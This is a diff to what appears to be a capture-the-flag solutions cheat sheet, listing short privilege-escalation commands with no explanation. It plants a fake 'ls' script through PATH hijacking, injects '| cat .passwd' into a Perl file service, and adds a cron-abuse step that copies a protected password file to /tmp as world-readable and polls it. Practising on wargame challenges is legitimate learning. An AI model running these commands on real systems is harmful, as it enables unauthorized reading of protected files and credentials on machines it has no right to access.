@@ -14,11 +14,17 @@ mkdir /tmp/challenge
 echo '#!/bin/sh' > /tmp/challenge/ls; echo '/bin/cat /<path>/.passwd' >> /tmp/challenge/ls; chmod +x /tmp/challenge/ls
 ./<program_name>
 
-## Perl injection
+## Perl Injection
 
 ./<program_opening_file> 
 *************************
 * Stat File Service    *
 *************************
 >>> | cat .passwd
+
+## Bash Cron
+
+echo '#!/bin/sh' > /tmp/._cron/cron; echo '/bin/cat /<path>/.passwd > /tmp/pass ; /bin/chmod 777 /tmp/pass' >> /tmp/._cron/cron; chmod 777 /tmp/._cron/cron
+
+while : ; do cat /tmp/pass ;sleep 5 ;done
 
